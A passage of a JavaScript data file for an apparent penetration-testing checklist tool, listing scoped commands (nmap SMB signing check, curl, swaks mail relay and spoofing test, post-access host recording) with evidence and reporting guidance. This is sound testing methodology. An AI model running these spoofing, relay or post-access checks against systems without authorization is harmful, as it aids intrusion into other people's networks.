            "command": "nmap -Pn -n -p 445 --script smb2-security-mode {HOST}",
            "validation": "The service does not require SMB signing where policy requires it. This supports a hardening finding, not a confirmed relay chain.",
            "runOn": "Testing workstation · Bash",
            "setup": "This command checks one concrete hardening condition. Monitoring and segmentation require separate evidence from the relevant controls.",
            "guidance": "This checks whether Windows file sharing requires message signing, a protection against tampering and some relay attacks. If signing is optional where it should be required, record that setting. Testing an actual relay requires additional conditions; this check does not demonstrate one.",
            "searchTerms": [
              "Hardening, lifecycle, and monitoring gaps"
            ]
          },
          {
            "title": "Reliability or operational observations",
            "check": "Record broken workflows, unavailable features, weak recovery arrangements, or documentation/process gaps when relevant to the engagement.",
            "evidence": "Reproduction, affected business workflow, impact, and scope relevance.",
            "caveat": "Separate functional defects from security vulnerabilities. Use an observation category when security impact is unproven.",
            "command": "curl -q --max-time 15 -o /dev/null -w 'HTTP=%{http_code} total=%{time_total}s\\n' {URL}",
            "validation": "A reproducible failure affects an agreed critical workflow. A single slow request or network timeout is an observation, not proof of a security defect.",
            "runOn": "Testing workstation · Bash",
            "setup": "Repeat a small number of times and compare with a known-good endpoint; do not load-test.",
            "guidance": "Check the response code and time for one important endpoint. Repeat a few times and compare with a working endpoint to separate application trouble from your network connection. Record repeatable failures and their effect on the workflow; one timeout is not enough to diagnose a vulnerability."
          },
          {
            "title": "Email spoofing and SMTP relay boundaries",
            "check": "Test with controlled sender/recipient addresses and establish which mail routes and identities are accepted.",
            "evidence": "Envelope sender, recipient, authentication context, accepted delivery, and headers.",
            "caveat": "Unauthenticated receipt for a server’s own domain is normal SMTP behavior. Sender spoofing and open third-party relay are distinct findings; neither is NTLM relay.",
            "command": "swaks --server {HOST} --from {MAIL_FROM} --to {MAIL_TO} --header \"Subject: KISS controlled relay test\" --body \"Controlled competition delivery test.\"",
            "validation": "A controlled received message demonstrates the claimed sender/relay boundary bypass. Record Authentication-Results and recipient behavior; SMTP connection acceptance is insufficient.",
            "runOn": "Testing workstation · Bash",
            "setup": "This sends one test message to your controlled recipient. For relay use two non-local controlled domains; for spoofing compare header/envelope identity and actual mailbox handling.",
            "guidance": "Send one test message to a mailbox you control. For a relay test, both addresses must be outside the server’s local domains. For sender spoofing, inspect the received sender and authentication headers. Save actual delivery evidence; a successful SMTP connection alone proves neither issue."
          },
          {
            "title": "Data minimization and excessive API responses",
            "check": "Compare fields returned to a user with fields required for that user’s task.",
            "evidence": "Actual extra sensitive fields, caller identity, and legitimate business purpose.",
            "caveat": "A field hidden by the UI can still be exposed in the API. Establish sensitivity and entitlement instead of reporting all unused fields.",
            "command": "KISS_CHECK_DIR=$(mktemp -d)\ncurl -q --config {BASELINE_CONFIG} --max-time 15 -D \"$KISS_CHECK_DIR/baseline.headers\" -o \"$KISS_CHECK_DIR/baseline.body\"\ncurl -q --config {TEST_CONFIG} --max-time 15 -D \"$KISS_CHECK_DIR/test.headers\" -o \"$KISS_CHECK_DIR/test.body\"\ndiff -u \"$KISS_CHECK_DIR/baseline.body\" \"$KISS_CHECK_DIR/test.body\"\nprintf 'Evidence: %s\\n' \"$KISS_CHECK_DIR\"",
            "validation": "The low-privilege response contains specific sensitive fields the user has no legitimate need or authorization to receive. Different JSON shape alone is not a vulnerability.",
            "runOn": "Testing workstation · Bash",
            "setup": "Prepare two curl config files, not raw HTTP requests or shell scripts. Each uses one option per line, for example url = \"https://app/path\", request = \"POST\", header = \"Cookie: session=...\", data = \"field=value\". Preserve the real method, body, content type, authentication and CSRF fields. Set their local paths below. A diff only locates changes; inspect the response and resulting application state. Baseline: the normal response for a low-privilege user. Test: the same route/record under the intended authorized role or a restricted field selection. Compare the exposed fields to task requirements.",
            "guidance": "Compare what a low-privilege account receives with the data needed for its task. Look for private fields such as another person’s details or internal secrets. Save the response and explain why those fields should be hidden; extra harmless JSON fields are not automatically a vulnerability."
          }
        ]
      },
      {
        "title": "Evidence & handoff",
        "items": [
          {
            "title": "Minimum useful finding",
            "check": "Write condition → evidence → impact → remediation. Include affected assets, identity/prerequisites, reproducible steps, and testing limitations.",
            "evidence": "Original output or request/response, timestamp, and a minimal annotated screenshot where useful.",
            "caveat": "Score demonstrated likelihood and impact, not the worst hypothetical outcome. Tool-assigned severity is only an input.",
            "command": "sha256sum -- {FILE}\nwc -c -- {FILE}\nsed -n '1,100p' -- {FILE}",
            "validation": "Evidence workflow: this verifies and previews an existing text artifact. The finding must still cite the original test, affected identity/resource, observed impact and remediation.",
            "runOn": "Testing workstation · Bash",
            "setup": "Set File path to the raw text evidence. Check it contains target, time, command and result, and write the claim using those facts.",
            "guidance": "Choose the original text evidence file. These commands identify it and preview the contents. Use it to write what happened, which host/account was affected, why that matters, and how to fix it. Make sure another teammate can repeat the test from your steps."
          },
          {
            "title": "Negative results still belong in activity",
            "check": "Record rejected authentication, unsuccessful attempts, blocked checks, and no-finding outcomes with the next useful step.",
            "evidence": "What was tested, from where/as whom, outcome, and evidence.",
            "caveat": "A failed exploit does not prove the system is secure. Distinguish rejected access from network/tool failure.",
            "command": "curl -q -i --max-time 15 {URL}\nKISS_CHECK_STATUS=$?\nprintf 'curl exit status: %s\\n' \"$KISS_CHECK_STATUS\"",
            "validation": "Evidence workflow: a rejection or error is a recorded test outcome, not a finding by itself. HTTP 403 may accompany curl exit status 0; preserve both layers.",
            "runOn": "Testing workstation · Bash",
            "setup": "Replay a relevant read-only URL and record the identity and why access was expected to succeed or fail.",
            "guidance": "Run the relevant read-only request and record both the HTTP response and curl’s exit status. For example, HTTP 403 can mean access was blocked even when curl exits successfully. Save unsuccessful checks too, so teammates know what was tried and what remains uncertain."
          },
          {
            "title": "Compare evidence files and avoid duplicate findings",
            "check": "Group the same root cause across affected hosts when remediation is shared. Link activities and evidence into the finding.",
            "evidence": "Affected-asset list and enough per-asset evidence to support the scope.",
            "caveat": "Keep genuinely different causes separate. Distinguish observed facts, tool reports, and hypotheses.",
            "command": "sha256sum -- {FILE} {OTHER_FILE}\ndiff -u -- {FILE} {OTHER_FILE}",
            "validation": "Evidence workflow: matching hashes identify identical artifacts, not necessarily identical root causes. Group findings only when the condition and remediation match.",
            "runOn": "Testing workstation · Bash",
            "setup": "Select two local text evidence files. diff exit status 1 means files differ, not that the tool failed.",
            "guidance": "Compare two local evidence files using their hashes and changed lines. Matching hashes identify duplicate captures. Group findings when they share the same cause and fix, and keep the affected hosts and original evidence linked. diff exit status 1 means the files differ.",
            "searchTerms": [
              "Deduplicate and preserve provenance"
            ]
          },
          {
            "title": "Evidence wins over report titles",
            "check": "Describe the exact identity and boundary actually reached, even if a scanner or historical report headline says more.",
            "evidence": "Execution identity, host/container context, and the demonstrated final step.",
            "caveat": "Base severity and remediation on verified evidence and relevant technical documentation.",
            "command": "sed -n '1,160p' -- {FILE}",
            "validation": "Evidence workflow: the original artifact must show the precise identity and capability claimed. Tool labels, banners and report titles cannot establish a higher level of access.",
            "runOn": "Testing workstation · Bash",
            "setup": "Set File path to the original scanner/command transcript; compare the claimed finding with the actual result.",
            "guidance": "Read the original output and describe the exact access demonstrated: listing files, reading a secret, logging in or executing a command. Match the finding’s impact to that result and link the supporting evidence."
          },
          {
            "title": "Retest and positive controls",
            "check": "Preserve successful remediation and controls that blocked an attack, alongside residual weaknesses.",
            "evidence": "Original condition, current test, scope, result, and remaining limitations.",
            "caveat": "A retest summary supports its stated status; it is weaker evidence than a detailed reproduced attack.",
            "command": "KISS_CHECK_DIR=$(mktemp -d)\ncurl -q --config {BASELINE_CONFIG} --max-time 15 -D \"$KISS_CHECK_DIR/baseline.headers\" -o \"$KISS_CHECK_DIR/baseline.body\"\ncurl -q --config {TEST_CONFIG} --max-time 15 -D \"$KISS_CHECK_DIR/test.headers\" -o \"$KISS_CHECK_DIR/test.body\"\ndiff -u \"$KISS_CHECK_DIR/baseline.body\" \"$KISS_CHECK_DIR/test.body\"\nprintf 'Evidence: %s\\n' \"$KISS_CHECK_DIR\"",
            "validation": "A remediation retest shows the formerly unauthorized operation blocked while a legitimate control still succeeds. A broken endpoint blocking everyone is not a successful fix.",
            "runOn": "Testing workstation · Bash",
            "setup": "Prepare two curl config files, not raw HTTP requests or shell scripts. Each uses one option per line, for example url = \"https://app/path\", request = \"POST\", header = \"Cookie: session=...\", data = \"field=value\". Preserve the real method, body, content type, authentication and CSRF fields. Set their local paths below. A diff only locates changes; inspect the response and resulting application state. Replay the same original proof after remediation and include a legitimate positive control. Compare the prior evidence with the new result.",
            "guidance": "Repeat the original test after the fix and also test a normal action that should still work. The unwanted access should fail while legitimate use succeeds. Keep before/after evidence. If every request now fails, you may have a broken application rather than a successful fix."
          },
          {
            "title": "Preserve command output and request context",
            "requires": "After a useful test result",
            "check": "Attach the original TXT, LDIF, Nmap output or request/response pair to the affected host or finding. Label it with the identity, target and collection time; summarize the important lines.",
            "command": "sha256sum -- {FILE}\nfile -- {FILE}\nwc -c -- {FILE}",
            "evidence": "Raw artifact plus a short explanation of the exact boundary crossed. Keep scanner observations separate from your verification.",
            "caveat": "Formatting and imported records can lose context. Do not turn every parser-extracted lead into a confirmed finding.",
            "validation": "Evidence workflow: a hash and file metadata establish artifact identity. They do not establish that a vulnerability exists.",
            "runOn": "Testing workstation · Bash",
            "setup": "Use the original output file, attach it to the affected host/finding, and record how and under which identity it was captured.",
            "guidance": "Use the original output file to collect its type, size and SHA-256 fingerprint. Attach it to the host or finding with the collection time, command and account used. Keep the unedited original so teammates can trace your conclusion back to the test."
          },
          {
            "title": "Write the access timeline as evidence-backed steps",
            "requires": "After confirming a new level of access",
            "check": "Record each transition: source host and identity → destination and identity → method → evidence → timestamp. Link the findings that enabled each step.",
            "command": "date -u +%Y-%m-%dT%H:%M:%SZ\nhostname\nid\nip route",
            "evidence": "Initial foothold, privilege changes, newly reached networks and the proof for every edge.",
            "caveat": "A scan-completed event does not establish access. Note time uncertainty and distinguish observed times from times entered later.",
            "validation": "Evidence workflow: this records the current Linux host/identity and collection time. Link each transition to its actual access proof; collection time is not necessarily the time access was obtained.",
            "runOn": "Target Linux host · shell",
            "setup": "Run immediately after a confirmed access transition. On Windows collect Get-Date -AsUTC, hostname and whoami /all instead.",
            "guidance": "Run this after reaching a Linux host to record the current time, machine, user and routes. Add how you got there and link the supporting finding. On Windows, use hostname and whoami /all with a timestamp. Distinguish the time access was gained from the time you recorded it."
          },
          {
            "title": "Finish with cleanup and a usable handoff",
            "requires": "Before reporting deadline",
            "check": "Reconcile modified files, temporary accounts, listeners and configuration changes. Give each finding a specific remediation and a retest condition; prioritize the changes that break the access path.",
            "command": "stat -- {FILE}\nsha256sum -- {FILE}\ndiff -u -- {OTHER_FILE} {FILE}",
            "evidence": "Cleanup state, unresolved artifacts, remaining limitations, owner and retest steps.",
            "caveat": "Do not silently delete client data or erase logs. Record work left incomplete so the next teammate does not assume it was checked.",
            "validation": "Evidence workflow: compare the tracked artifact with its known pre-test version. A matching file does not establish that all other accounts, listeners or changes are cleaned up.",
            "runOn": "Testing workstation · Bash",
            "setup": "Set File path to one tracked artifact and Comparison file to its original backup. This inspects state without deleting or restoring anything.",
            "guidance": "Set File path to one tracked file and Comparison file to its original backup. Check whether your changes remain, then record any work still needed. These commands do not restore or delete anything. Review temporary accounts, listeners and other changes separately before declaring cleanup complete."
          }
        ]
      }
    ]
  }
];

export function filterSections(query, active) {
  const term = query.trim().toLowerCase();
  return sections.filter(section => term || section.id === active).map(section => ({
    ...section,
    groups: section.groups.map(group => ({
      ...group,
      items: group.items.filter(item => !term || [section.title, group.title, item.title,
        ...(item.searchTerms || []), item.requires, item.runOn, item.setup, item.guidance, item.validation, item.check, item.evidence, item.caveat, item.command,
        ...(item.references || []).map(source => source.label)
      ].join(' ').toLowerCase().includes(term))
    })).filter(group => group.items.length)
  })).filter(section => section.groups.length);
}
